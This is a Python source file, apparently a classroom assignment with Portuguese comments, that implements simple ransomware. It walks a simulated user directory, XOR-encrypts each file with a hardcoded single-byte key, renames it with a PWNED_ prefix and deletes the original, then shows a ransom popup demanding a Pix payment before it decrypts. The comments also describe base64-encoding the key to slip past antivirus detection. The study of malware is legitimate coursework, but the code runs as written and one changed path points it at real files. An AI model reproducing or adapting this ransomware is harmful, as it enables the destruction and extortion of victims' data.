# -*- coding: utf-8 -*-

import os
import base64
from tkinter import *
from tkinter import messagebox

# 1 - Escolha um dos malwares apresentados em sala de aula e o implemente.
# ESCOLHI RANSOMWARE...

# The aim of crypto ransomware is to encrypt your important data, such as documents,
# pictures and videos, but not to interfere with basic computer functions.
# This spreads panic because users can SEE their files but cannot ACCESS them.

variable_for_popup = ""

def scan_recursively(baseDir, list):
    for entry in os.scandir(baseDir):
        if entry.is_file():
            if not(".DS_Store") in entry.path:  # Coisa do MAC
                list.append(entry.path)
        else:
            myList = ['Program Files', "Lixeira"]
            if not (any(element in entry.path for element in myList)):
                scan_recursively(entry, list)

def faz_o_xor(byteData, keyValue):
    for index, values in enumerate(byteData):
        byteData[index] = values ^ keyValue

def basic_op(previous_file, new_file, key):
    fil = open(previous_file, 'rb')
    data = fil.read()
    fil.close()
    byteData = bytearray(data)

    keyValue = int(key)
    faz_o_xor(byteData, keyValue)

    fil = open(new_file, 'wb')
    fil.write(byteData)
    fil.close()

def crypt(path, key):
    # A criptografia apenas altera os dados para ficarem ilegíveis
    # Nesse caso faz um XOR.
    # Ela não é difícil de ser quebrada, mas realiza o que é pedido na questão.

    try:
        file_init = 'PWNED_'
        fil = path.split(os.sep)[-1]  # fiz isso na VP2 tbm!
        rest = path.split(os.sep)[0:-1]
        rest = os.sep.join(rest)
        encryptedFile = rest + os.sep + file_init + fil

        basic_op(path, encryptedFile, key)
        os.remove(path)
    except Exception as e:
        print("Error", e)

def decrypt(path, key):
    try:
        path_without_init = path.replace("PWNED_", "")
        basic_op(path, path_without_init, key)
        os.remove(path)
    except Exception as e:
        print("Error", e)

def popup():
    janela = Tk()
    janela.title('U3p4 Ransomware')
    janela.geometry('500x300')
    janela.resizable(False, False)

    label1 = Label(janela, text='\n\nPERDEU PLAYBOY, faz um pix pra XYZ de 500 reais', font=(
        'calibri', 15)).pack()
    label2 = Label(janela, text='ou adeus aos seus arquivos',
                   font=('calibri', 15, 'bold')).pack()
    label3 = Label(janela, text='(Eu podia implementar um contador aqui mas tá bom assim', font=(
        'calibri', 15)).pack()
    label4 = Label(janela, text='PS: Não feche essa janela ou terá que refazer os arquivos\n' +
                   '(renomear o backup pra "HD_FAKE_SIMULADO)\n', font=('calibri', 15, 'bold')).pack()
    label5 = Label(janela, text='Digite a senha (o melhor número):\n',
                   font=('calibri', 15)).pack()

    def querypg():
        global variable_for_popup
        A = B.get()
        variable_for_popup = A
        messagebox.showinfo("Okaaaayyy?", "Conferindo...")
        janela.destroy()

    B = StringVar()
    Entry(janela, textvariable=B).pack()
    Button(janela, text="Submit",
           command=querypg).pack()

    janela.mainloop()

def key_okay(tentativa):
    base64_original = b'MTM='
    tentativa = tentativa.encode()
    b64_nova = base64.b64encode(tentativa)
    if (base64_original == b64_nova):
        return True
    return False


if __name__ == "__main__":
    parentDir = os.path.dirname(os.path.abspath(__file__))
    fakeUser = "HD_FAKE_SIMULADO" + os.sep + "Usuarios" + os.sep + "Fulano_D_Tal"

    # Declara current user (na vida real, usaria um usuario real)
    currentUser = os.path.join(parentDir, fakeUser)

    # For pasta in [CURRENT USER] e filhos put path in list
    filesToCrypt = []
    scan_recursively(currentUser, filesToCrypt)
    print(filesToCrypt)

    # Coloca uma chave hardcoded. Poderia ser uma simétrica, mas não é o objetivo da questão,
    # pois já houve questões com esse objetivo antes.
    # A chave deve ser entre 0 e 256 (máximo 255) pois é um int para fazer o XOR
    # Para tornar mais difícil de detectar por um antivirus, faz um base64 da chave e decodifica no código
    # Poderia, ainda, criptografar ela.
    k = base64.b64decode("MTM=")

    # Adiciona criptografia para todas as pastas e filhos? na lista, que não seja program files [t2]
    # Adiciona PWNED no inicio dos files, just for fun
    for file in filesToCrypt:
        crypt(file, k)

    # Aparece POPUP com um campo para colocar a senha para get chave e descriptografar [t3]
    popup()
    print(variable_for_popup)

    # Confere se tudo ta okay pra descriptografar
    if key_okay(variable_for_popup):
        messagebox.showinfo("Okaaaayyy?", "Certo, RECEBA!")
        fileToDecrypt = []
        scan_recursively(currentUser, fileToDecrypt)
        for file in fileToDecrypt:
            decrypt(file, k)

    else:
        messagebox.showinfo("Okaaaayyy?", "ERRADO!")
        exit()
